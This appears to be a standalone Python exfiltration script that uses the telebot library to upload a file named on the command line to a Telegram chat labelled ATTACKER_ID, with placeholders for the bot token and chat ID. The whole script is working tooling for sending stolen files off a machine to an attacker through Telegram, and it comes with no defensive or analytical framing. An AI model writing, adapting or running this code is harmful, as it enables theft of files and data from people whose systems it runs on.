import os
import sys
import telebot

# YOU CAN MODIFY 
# BOT_TOKEN = 'MODIFY'
# GROUP_CHAT_ID = 'MODIFY'
# INSTALL PYTHON AND TELEBOT

BOT_TOKEN = 'MODIFY'

ATTACKER_ID = 'MODIFY'

bot = telebot.TeleBot(BOT_TOKEN)

def send_message(message):
    bot.send_message(ATTACKER_ID, message)

def upload_file(file_path):
    try:
        file_name = os.path.basename(file_path)

        with open(file_path, 'rb') as f:
            bot.send_document(ATTACKER_ID, f, caption=f'File "{file_name}" uploaded successfully!')

    except Exception as e:
        send_message(f'Error uploading file: {str(e)}')

if len(sys.argv) != 2:
    print("Usage: python upload.py <file_path>")
    sys.exit(1)

file_path = sys.argv[1]

upload_file(file_path)
